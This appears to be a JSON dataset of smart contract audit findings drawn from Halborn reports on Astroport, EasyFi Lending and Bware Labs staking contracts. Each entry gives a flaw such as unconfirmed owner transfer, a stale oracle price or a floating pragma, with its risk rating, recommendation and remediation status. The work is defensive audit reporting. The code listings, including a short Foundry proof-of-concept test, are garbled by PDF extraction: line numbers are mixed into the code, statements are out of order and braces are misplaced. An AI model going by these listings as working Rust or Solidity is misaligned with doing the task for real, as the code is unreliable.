handle_claim_rewards_and_unlock_for_lockup ( 883 884 885 886 887 888 mut deps : DepsMut , env : Env , info : MessageInfo , terraswap_lp_token : String , duration : u64 , withdraw_lp_stake : bool , 16 let state = STATE . load ( deps . storage ) ?; 889 ) -> StdResult < Response > { 890 891 892 893 if !state . are_claims_allowed { return Err ( StdError :: generic_err (\" Reward claim not allowed 894 895 896 897 898 899 \" )); } let config = CONFIG . load ( deps . storage ) ?; let user_address = info . sender ; let terraswap_lp_token = deps . api . addr_validate (& terraswap_lp_token ) ?; Risk Level: Likelihood - 3 Impact - 5 Recommendations: Add a restriction in handle_claim_rewards_and_unlock_for_lockup function to throw an error message if claiming in lockdrop contract is made before deposit and withdrawal windows. Remediation plan: SOLVED: The issue was fixed in commit f20d8471b8ef5325d56a556f3a1953185ddc4145. 17 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Periphery_Contracts_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "An incorrect use of the handle_update_config function in contracts can set owner to an invalid address and inadvertently lose control of the contracts, which cannot be undone in any way. Currently, the owner of the contracts can change owner address using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  airdrop  auction  lockdrop Code Location: Listing 2: contracts/airdrop/src/contract.rs (Lines 143) 142 if let Some ( owner ) = owner { 143 144 145 } config . owner = deps . api . addr_validate (& owner ) ?; attributes . push ( attr ( \" new_owner \" , owner . as_str () )) Listing 3: contracts/auction/src/contract.rs (Lines 178) 176 // UPDATE :: ADDRESSES IF PROVIDED 177 if let Some ( owner ) = new_config . owner { 178 179 180 } config . owner = deps . api . addr_validate (& owner ) ?; attributes . push ( attr ( \" owner \" , config . owner . to_string () )) ; 18 Listing 4: contracts/lockdrop/src/contract.rs (Lines 249) 248 if let Some ( owner ) = new_config . owner { 249 250 251 }; config . owner = deps . api . addr_validate (& owner ) ?; attributes . push ( attr ( \" new_owner \" , owner . as_str () )) Risk Level: Likelihood - 2 Impact - 4 Recommendations: It is recommended to split owner transfer functionality into set_owner and accept_ownership functions. The latter function allows the transfer to be completed by the recipient. Remediation plan:: RISK ACCEPTED: The Astroport team accepted the risk for this finding. 19 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Periphery_Contracts_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "INITIAL TIMESTAMPS DO NOT HAVE A MINIMUM THRESHOLD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "instantiate function in contracts does not verify that initial timestamps (from_timestamp, init_timestamp) are greater than current timestamp. As a consequence, if contracts are deployed with inaccurate initial timestamps could generate unexpected situations, e.g.: possibility to withdraw Terraswap LP tokens after claiming rewards, see HAL-01 for more details. The affected smart contracts are the following:  airdrop  auction Code Location: Listing 5: contracts/airdrop/src/contract.rs (Lines 50) 46 let config = Config { 47 48 owner , astro_token_address : deps . api . addr_validate (& msg . astro_token_address )? , merkle_roots : msg . merkle_roots . unwrap_or_default () , from_timestamp , to_timestamp : msg . to_timestamp , auction_contract_address : None , are_claims_enabled : false , 49 50 51 52 53 54 }; Listing 6: contracts/auction/src/contract.rs (Lines 52) 39 let config = Config { owner : msg 40 . owner 41 . map (| v | deps . api . addr_validate (& v )) 42 . transpose () ? 43 20 . unwrap_or ( info . sender ) , astro_token_address : deps . api . addr_validate (& msg . astro_token_address )? , airdrop_contract_address : deps . api . addr_validate (& msg . airdrop_contract_address )? , lockdrop_contract_address : deps . api . addr_validate (& msg . lockdrop_contract_address )? , pool_info : None , generator_contract : None , astro_incentive_amount : None , lp_tokens_vesting_duration : msg . lp_tokens_vesting_duration , init_timestamp : msg . init_timestamp , deposit_window : msg . deposit_window , withdrawal_window : msg . withdrawal_window , 44 45 46 47 48 49 50 51 52 53 54 55 }; Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to update the logic of instantiate function in contracts mentioned above to validate that initial timestamps (from_timestamp, init_timestamp) are greater than current timestamp. Remediation plan:: RISK ACCEPTED: The Astroport team accepted the risk for this finding. 21 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Periphery_Contracts_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "OWNER CAN INITIALIZE REPEATED POOLS IN LOCKDROP CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "handle_initialize_pool function in contracts/lockdrop/src/contract.rs allows the possibility that owner mistakenly initializes repeated pools in lockdrop contract. This issue happens because may_load function will consider that two terraswap_lp_token addresses are different if they differ just in their upper / lower cases. The situation described above could generates unexpected situations, e.g.: a user could increase size of an unintended lockup position. Code Location: Listing 7: contracts/lockdrop/src/contract.rs (Lines 344,345) 341 let terraswap_lp_token = deps . api . addr_validate (& terraswap_lp_token ) ?; if ASSET_POOLS 342 343 // CHECK ::: Is LP Token Pool already initialized 344 345 346 347 348 349 . may_load ( deps . storage , & terraswap_lp_token )? . is_some () } { return Err ( StdError :: generic_err (\" Already supported \" )) ; Risk Level: Likelihood - 1 Impact - 3 22 Recommendations: Update the logic of handle_initialize_pool to turn terraswap_lp_token address into lowercase before calling may_load function. Remediation plan:: RISK ACCEPTED: The Astroport team accepted the risk for this finding. 23 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Periphery_Contracts_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "INCENTIVES SHARE CAN BE CHANGED UNRESTRICTEDLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "handle_update_pool function in contracts/lockdrop/src/contract.rs allows owner to change incentives share (incentives_share) unrestrictedly in If this value is changed to a lower one after lockdrop contract. init_timestamp, it could reduce rewards for users that have already deposited Terraswap LP tokens. Code Location: Listing 8: contracts/lockdrop/src/contract.rs (Lines 402,418) 402 if env . block . time . seconds () >= config . init_timestamp + config . \" Pools cannot be updated post deposit window closure \" , deposit_window { return Err ( StdError :: generic_err ( 403 404 405 406 } 407 408 let terraswap_lp_token = deps . api . addr_validate (& )); terraswap_lp_token ) ?; 409 410 // CHECK ::: Is LP Token Pool initialized 411 let mut pool_info = ASSET_POOLS . load ( deps . storage , & terraswap_lp_token ) ?; 412 413 // update total incentives 414 state . total_incentives_share = 415 state . total_incentives_share - pool_info . incentives_share + incentives_share ; 416 417 // Update Pool Incentives 418 pool_info . incentives_share = incentives_share ; 419 420 ASSET_POOLS . save ( deps . storage , & terraswap_lp_token , & pool_info ) ?; 421 STATE . save ( deps . storage , & state ) ?; 24 Risk Level: Likelihood - 1 Impact - 3 Recommendations: It is recommended to not allow changes to incentives_share after init_timestamp. Otherwise, do not allow lower values if someone has already deposited. Remediation plan: SOLVED: The issue was fixed in commit f20d8471b8ef5325d56a556f3a1953185ddc4145. 25 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Periphery_Contracts_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "MAXIMUM THRESHOLD FOR SLIPPAGE IS NOT ENFORCED WHEN ADDING LIQUIDITY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When owner calls handle_init_pool function in contracts/auction/src/con- tract.rs to add liquidity and do not specify slippage tolerance in the operation, Astroport AMM protocol does not enforce a default maximum threshold, which could affect the amount of tokens received in return. However, this is an unlikely scenario because the operation is executed before users other than owner are able to claim their ASTRO tokens to provide liquidity to ASTRO-UST pool. Code Location: The slippage argument was directly provided to the build_provide_liquidity_ to_lp_pool_msg function without any previous validation. Listing 9: contracts/auction/src/contract.rs (Lines 478) 472 msgs . push ( build_provide_liquidity_to_lp_pool_msg ( 473 474 475 476 477 478 479 ) ?) ; deps . as_ref () , config . astro_token_address , astro_ust_pool_address , ust_coin . amount , state . total_astro_delegated , slippage , Risk Level: Likelihood - 1 Impact - 2 26 Recommendation: It is recommended to enforce the use of a default maximum threshold for slippage in handle_init_pool function. As a reference, max slippage for Uniswap Pool is 50%. Remediation plan:: ACKNOWLEDGED: The Astroport team acknowledged this finding. 27 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Periphery_Contracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "AUCTION ADDRESS CANNOT BE CHANGED IF SET WITH AN ERRONEOUS VALUE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "handle_update_config function in contracts does not allow owner to change auction address if set with an erroneous value. As a consequence, users wont be able to delegate their ASTRO tokens and operations will always throw error messages. The affected smart contracts are the following:  airdrop  lockdrop Code Location: Listing 10: contracts/airdrop/src/contract.rs 147 if let Some ( auction_contract_address ) = auction_contract_address { 148 149 150 return Err ( StdError :: generic_err ( \" Auction contract match config . auction_contract_address { Some (_ ) => { 151 152 153 154 155 already set . \")) ; } None => { config . auction_contract_address = Some ( deps . api . addr_validate (& auction_contract_address ) ?) ; attributes . push ( attr (\" auction_contract \" , auction_contract_address )) 156 157 158 } } } 28 Listing 11: contracts/lockdrop/src/contract.rs 258 if let Some ( auction ) = new_config . auction_contract_address { 259 260 261 return Err ( StdError :: generic_err ( \" Auction contract match config . auction_contract { Some (_ ) => { already set . \")) ; } None => { config . auction_contract = Some ( deps . api . addr_validate (& auction ) ?) ; attributes . push ( attr (\" auction_contract \" , auction )) } } 262 263 264 265 266 267 268 }; Risk Level: Likelihood - 1 Impact - 2 Recommendations: It is recommended to allow changes to auction address in contracts before initial timestamps (from_timestamp, init_timestamp). Remediation plan:: ACKNOWLEDGED: The Astroport team acknowledged this finding. 29 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Periphery_Contracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "ASSETS WITHDRAWN FROM TERRASWAP SHOULD MATCH ASSETS IN ASTROPORT POOL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "handle_migrate_liquidity function in contracts/lockdrop/src/contract.rs does not ensure that assets to withdraw from Terraswap match assets in Astroport pool. This security issue is considered as informational because the validation is done in Astroport AMM protocol and operations will always throw error messages. However, from a security in depth perspective, validation should not rely only in external components (AMM protocol in this case) and should be enforced in lockdrop contract, too. Code Location: Listing 12: contracts/lockdrop/src/contract.rs (Lines 541,543) 540 // COSMOS MSG :: CALLBACK AFTER LIQUIDITY WITHDRAWAL 541 let update_state_msg = CallbackMsg :: WithdrawLiquidityFromTerraswapCallback { terraswap_lp_token : terraswap_lp_token . clone () , astroport_pool : astroport_pool . clone () , prev_assets : assets . try_into () . unwrap () , 542 543 544 545 } 546 . to_cosmos_msg (& env ) ?; 547 cosmos_msgs . push ( update_state_msg ); Risk Level: Likelihood - 1 Impact - 2 30 Recommendations: Update the logic of handle_migrate_liquidity function to ensure that assets to withdraw from Terraswap match assets in Astroport pool. Remediation plan:: ACKNOWLEDGED: The Astroport team acknowledged this finding. 31 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Periphery_Contracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "POTENTIAL INCONSISTENCY IN TOTAL AIRDROP SIZE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Periphery_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "instantiate function in contracts/airdrop/src/contract.rs does not val- idate that total_airdrop_size has the same value than amount of ASTRO tokens transferred to aidrop contract, which could create an inconsistency in case an inaccurate amount of ASTRO tokens are transferred. Code Location: Listing 13: contracts/airdrop/src/contract.rs (Lines 57) 56 let state = State { 57 58 59 60 }; total_airdrop_size : msg . total_airdrop_size , total_delegated_amount : Uint128 :: zero () , unclaimed_tokens : msg . total_airdrop_size , Risk Level: Likelihood - 1 Impact - 2 Recommendations: Create a separate function in contract to update total_airdrop_size when called by ASTRO token contract through a Cw20ReceiveMsg message. Remediation plan:: SOLVED: The issue was fixed in commit c61cc86c9ce86b2175ff70d1070ba9ae17013a53. 32 3.10 (HAL-10) POTENTIAL DIVISION BY ZERO - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Astroport_fi_Periphery_Contracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISUSE OF AN ORACLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "SimplePriceOracle.sol is calling latestAnswer to get the last asset price. This method will return the last value, but it will not allow to check if the data is fresh. On the other hand, calling the method latestRoundData allows to run additional validation. Code Location: SimplePriceOracle.sol Lines# 44-142 Listing 1 1 2 3 4 5 6 7 8 9 10 11 12 function getUnderlyingPrice ( CToken cToken ) public view returns ( uint256 ) { // if (! isStockAsset [ _asset ]) { if ( compareStrings ( cToken . symbol () , \" cETH \")) { address _aggregator = aggregator [ bnbUnderlying ]; ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 10**10 ); assert ( error == MathError . NO_ERROR ); return price ; } [ Redacted for brevity ] Recommendation: It is recommended to use the latestRoundData function to retrieve an assets price instead. Checks on the return data should be introduced with proper revert messages if the price is stale or the round is uncomplete. For example: 15 Listing 2 1 2 3 4 5 6 7 8 9 10 ( roundId , rawPrice , , updateTime , answeredInRound ) = AccessControlledAggregator ( _aggregator ). latestRoundData () ; require ( rawPrice > 0, \" Chainlink price <= 0 \"); require ( updateTime != 0 , \" Incomplete round \" ); require ( answeredInRound >= roundId , \" Stale price \" ); Remediation Plan: SOLVED : EasyFi team replaced the API latestAnswer with latestRoundData in all instances. 16 ",
        "labels": [
            "Halborn",
            "EasyFi_Lending",
            "Severity: Medium"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Contracts should be deployed with the same compiler version and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma. For example, an outdated pragma version might introduce bugs that affect the contract system negatively or recently released pragma versions may have unknown security vulnerabilities. Listing 3 1 pragma solidity ^0.5.16; Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider locking the pragma version as it is not recommended to use a floating pragma in production. Apart from just locking the pragma version in the code, the sign (>=) needs to be removed. It is possible to lock the pragma by fixing the version both in truffle-config.js for the Truffle framework or in hardhat.config.js for the HardHat framework. Remediation Plan: SOLVED : EasyFi team amended all smart contracts to lock the pragma version. 17 ",
        "labels": [
            "Halborn",
            "EasyFi_Lending",
            "Severity: Low"
        ]
    },
    {
        "title": "USAGE OF ASSERT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The assert function should only be used to test for internal errors, and to check invariants according to https://solidity.readthedocs.io/en/latest/control- structures.html#id4. Code Location: SimplePriceOracle.sol Lines# 44-188 Listing 4: SimplePriceOracle.sol 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 function getUnderlyingPrice ( CToken cToken ) public view returns ( uint256 ) { // if (! isStockAsset [ _asset ]) { if ( compareStrings ( cToken . symbol () , \" cETH \")) { address _aggregator = aggregator [ bnbUnderlying ]; ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 10**10 ); assert ( error == MathError . NO_ERROR ); return price ; } else { address _aggregator = aggregator [ address ( CErc20 ( address ( cToken )) . underlying () ) ]; uint8 underlyingDecimals = EIP20Interface ( address ( CErc20 ( address ( cToken )) . underlying () ) ). decimals () ; if ( underlyingDecimals == 18) { ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 18 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 10**10 ); assert ( error == MathError . NO_ERROR ); return price ; } if ( underlyingDecimals == 6) { ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 10**22 ); assert ( error == MathError . NO_ERROR ); return price ; } if ( underlyingDecimals == 8) { ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 10**20 ); assert ( error == MathError . NO_ERROR ); return price ; } } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: The usage of assert should be reviewed and if it is inappropriate, the exception should be changed with revert. It is recommended to use require() function instead of assert() function. This change will improve 19 code readability. The example code snippet can be seen below. Listing 5: SimplePriceOracle.sol 64 65 66 67 68 69 70 71 72 73 function getUnderlyingPrice ( CToken cToken ) public view returns ( uint256 ) { // if (! isStockAsset [ _asset ]) { if ( compareStrings ( cToken . symbol () , \" cETH \")) { address _aggregator = aggregator [ bnbUnderlying ]; ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 10**10 ); require ( error == MathError . NO_ERROR , \" Error with calculation \" ); return price ; Remediation Plan: SOLVED : assert was replaced with require within the SimplePriceOracle.sol smart contract. 20 ",
        "labels": [
            "Halborn",
            "EasyFi_Lending",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF DUPLICATE AGGREGATOR CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the manual code review, it has been observed that the duplicate aggregators have not been checked on the constructor. Although the function is authorized by a contract deployer, the duplicate aggregator should be checked on the related function. Code Location: SimplePriceOracle.sol Lines# 17 Listing 6 1 2 3 4 5 6 7 8 constructor ( address [] memory _assets , address [] memory _aggregators ) public { } admin = msg . sender ; for ( uint256 i = 0; i < _assets . length ; i ++) { aggregator [ _assets [ i ]] = _aggregators [i ]; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider to eliminate duplicate variables on the aggregators array. 21 Remediation Plan: ACKNOWLEDGED: EasyFi team informed that the data will be passed by admin at time of deployment, where duplication will be taken care. 22 ",
        "labels": [
            "Halborn",
            "EasyFi_Lending",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Some addresses used in constructors and functions are not being validated. Every address should be validated and checked that is different than zero. Aggregators and assets should not be equal to zero. Code Location: SimplePriceOracle.sol Lines# 17 Listing 7 1 2 3 4 5 6 7 8 constructor ( address [] memory _assets , address [] memory _aggregators ) public { } admin = msg . sender ; for ( uint256 i = 0; i < _assets . length ; i ++) { aggregator [ _assets [ i ]] = _aggregators [i ]; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to validate that every address input is different than zero. 23 Remediation Plan: ACKNOWLEDGED: EasyFi team informed that the data will be passed by admin at time of deployment, where zero address check will be taken care. 24 ",
        "labels": [
            "Halborn",
            "EasyFi_Lending",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. The public function uses 496 gas, while the external function uses only 261. Also, methods do not necessarily have to be public if they are only called within the contract - in such case they should be marked internal. Code Location: Below are smart contract and Its corresponding functions affected: SimplePriceOracle.sol: addAsset, addStockAsset, getUnderlyingPrice, getUnderlyingPrice1 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you expect that the function will only be called externally and use public if you need to call the function internally. To sum up, everyone can access public functions, external functions can only be accessed externally and 25 internal functions can only be called within the contract. Remediation Plan: SOLVED : EasyFi team replaced public with external in the recommended functions. 26 ",
        "labels": [
            "Halborn",
            "EasyFi_Lending",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING EVENTS EMISSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It has been observed that important functionality is missing emitting event for some functions on the SimplePriceOracle.sol contract. These Events are a method of informing the functions should emit events. transaction initiator about the actions taken by the called function. An events logs its emitted parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. Code Location: SimplePriceOracle.sol Lines# 34-39 Listing 8: SimplePriceOracle.sol (Lines 34,39) 34 35 36 37 38 39 40 41 42 function addAsset ( address _asset , address _aggregator ) public onlyAdmin { require ( aggregator [ _asset ] == address (0) , \" Already added \" ) ; aggregator [ _asset ] = _aggregator ; } function addStockAsset ( address _asset , uint256 _price ) public onlyAdmin { isStockAsset [ _asset ] = true ; assetPrice [ _asset ] = _price ; } Risk Level: Likelihood - 1 Impact - 2 27 Recommendations: For best security practices, consider declaring events as often as pos- sible at the end of a function. Events can be used to detect the end of the operation. Remediation Plan: SOLVED : EasyFi team implemented Event emission where recommended. 28 ",
        "labels": [
            "Halborn",
            "EasyFi_Lending",
            "Severity: Informational"
        ]
    },
    {
        "title": "EXPERIMENTAL FEATURES ENABLED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(...) as arguments in external function calls or in event data without prior assignment to a local variable. Using return does not trigger the bug. The types bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Furthermore, arrays with elements shorter than 32 bytes may not be handled correctly even if the base type is an integer. Encoding such arrays in the way described above can lead to other data in the encoding being overwritten if the number of elements encoded is not a multiple of the number of elements that fit a single slot. If nothing follows the array in the encoding (note that dynamically-sized arrays are always encoded after statically-sized arrays with statically-sized content), or if only a single array is encoded, no other data is overwritten. There are known bugs that are publicly released while using this feature. However, the bug only manifests itself when all the following conditions are met: 1. Storage data involving arrays or structs is sent directly to an external function call, to abi.encode or to event data without prior assignment to a local (memory) variable. 2. There is an array that contains elements with size less than 32 bytes or a struct that has elements that share a storage slot or members of type bytesNN shorter than 32 bytes. In addition to that, in the following situations, the code is NOT affected: 1. If all the structs or arrays only use uint256 or int256 types. 29 2. If you only use integer types (that may be shorter) and only encode at most one array at a time. 3. If you only return such data and do not use it in abi.encode, external calls or event data. ABIEncoderV2 is enabled to allow to pass the struct type into a function in both web3 and another contract. Naturally, any bug can have wildly varying consequences depending on the program control flow, but it is expected expected that this is more likely to lead to malfunction than exploitability. The bug, when triggered, will under certain circumstances send corrupt parameters on method invocations to other contracts. Reference: https://blog.ethereum.org/2019/03/26/solidity-optimizer-and-abiencoderv2-bug/ Code Location: Listing 9 1 pragma experimental ABIEncoderV2 ; Risk Level: Likelihood - 1 Impact - 2 Recommendation: When possible, do not use experimental features in the final live de- ployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). 30 Remediation Plan: ACKNOWLEDGED: EasiFy team limited the use of experimental features to only the necessary items. 31 ",
        "labels": [
            "Halborn",
            "EasyFi_Lending",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSED CODE SECTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "the smart contract the In getUnderlyingPrice1 function is the same as the getUnderlyingPrice Therefore, the stated code base should be deleted from the function. repository. Additionally, a large commented block of code was found. SimplePriceOracle.sol, code the of Code Location: SimplePriceOracle.sol Lines# 94-142 Listing 10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function getUnderlyingPrice1 ( CToken cToken ) public view returns ( uint256 , address ) { if ( compareStrings ( cToken . symbol () , \" cETH \")) { address _aggregator = aggregator [ bnbUnderlying ]; ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 10**10 ); assert ( error == MathError . NO_ERROR ); return ( price , _aggregator ); } else { address _aggregator = aggregator [ address ( CErc20 ( address ( cToken )) . underlying () ) ]; uint8 underlyingDecimals = EIP20Interface ( address ( CErc20 ( address ( cToken )) . underlying () ) ). decimals () ; return ( underlyingDecimals , _aggregator ); // if ( underlyingDecimals == 18) { // // // uint256 ( ( MathError error , uint256 price ) = mulUInt ( AccessControlledAggregator ( _aggregator ) . latestAnswer () 32 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 ( MathError error , uint256 price ) = mulUInt ( AccessControlledAggregator ( _aggregator ) ) ; assert ( error == MathError . NO_ERROR ) ; return price ; ) , 10**10 // // // // // // } // if ( underlyingDecimals == 6) { // // // uint256 ( . latestAnswer () ) ; assert ( error == MathError . NO_ERROR ) ; return price ; ) , 10**22 // // // // // // } // if ( underlyingDecimals == 8) { // // // uint256 ( ( MathError error , uint256 price ) = mulUInt ( AccessControlledAggregator ( _aggregator ) . latestAnswer () ) , 10**20 ) ; assert ( error == MathError . NO_ERROR ) ; return price ; // // // // // // } } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: As stated on the description, getUnderlyingPrice1 should be deleted from the contract. This will reduce gas cost and code complexity. 33 Remediation Plan: SOLVED: EasyFi team amended the code base to remove duplicates and re- dundant code. 34 3.10 (HAL-10) USAGE OF ABI ENCODEPACKED FUNCTION - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "EasyFi_Lending",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSABLE STAKING POOL AFTER POOL OWNER UNSTAKE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bware_Labs_Staking_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf.pdf",
        "body": "A staking pool cannot be reused once the pool owner unstakes their tokens from the pool. That means, if a poolOwner removes all their stake from the node operator and the pool is set to TERMINATED, if the pool owner wants to stake again in the same pool with the same address, nodeIndex and chainId, they cannot do it. Code Location: Code Section - DelegationsAdapter.sol#L128 Listing 1: DelegationsAdapter.sol (Line 128) 126 function _stake ( bytes32 poolId , address delegator , Currency []  memory currencies ) internal { 127 128 129 130 131 validateCurrencies ( currencies ); require ( poolOperative ( poolId ) , \" E104 \" ); // regular delegators can only stake main token require ( ( currencies . length == 1 && currencies [0]. erc20 ==  rewardsToken () ) || isPoolOwner ( delegator , poolId ) , 132 133 134 135 136 137 138 \" E105 \" ); _updateDelegation ( poolId , delegator , currencies , true ); assert ( poolOperative ( poolId )); } 19 Code Section - StakingStorage.sol#L116 Listing 2: StakingStorage.sol (Line 116) 114 function poolOperative ( bytes32 poolId ) public view returns (  bool ) { 115 116 Pool storage poolPtr = _poolsArchive [ poolId ]; return poolExists ( poolId ) && poolPtr . delegations [ poolPtr .  meta . owner ]. deposited . nextEpochBalance != 0; 117 } Proof Of Concept: Listing 3: HalbornTest.t.sol bytes32 poolId = _setUpSimpleEnv ( MIN_POOL_OWNER_STAKE , _basicNextEpoch ( times , poolId ); _delegate ( alice , poolId , 10 ether , address ( aToken )) ; vm . startPrank ( alice ); stakingContract . undelegate ( poolId , currencies ); vm . stopPrank () ; // HAL01 function test_IT_01_poolOwner_01 () public { uint256 times = 5; _basicNextEpoch ( times , poolId ); 1 2 3  alice ); 4 5 6 7 8 9 10 11 12 13 14 15 16 17  poolOwner ) internal returns ( bytes32 poolId ){ 18 19 20 21 22 23 24 25 26 vm . startPrank ( owner ); aToken . transfer ( poolOwner , poolOwnerStake ); vm . stopPrank () ; } // HELPER FUNCTIONS function _setUpSimpleEnv ( uint256 poolOwnerStake , address aCurrency . erc20 = IERC20Upgradeable ( address ( aToken )) ; aCurrency . amount = MIN_POOL_OWNER_STAKE ; vm . startPrank ( poolOwner ); aToken . approve ( address ( stakingContract ) , poolOwnerStake ); 20 poolId = bytes32 ( abi . encodePacked ( poolOwner , uint64 (0) , } vm . stopPrank () ; function _basicNextEpoch ( uint256 times , bytes32 poolId ) vm . startPrank ( 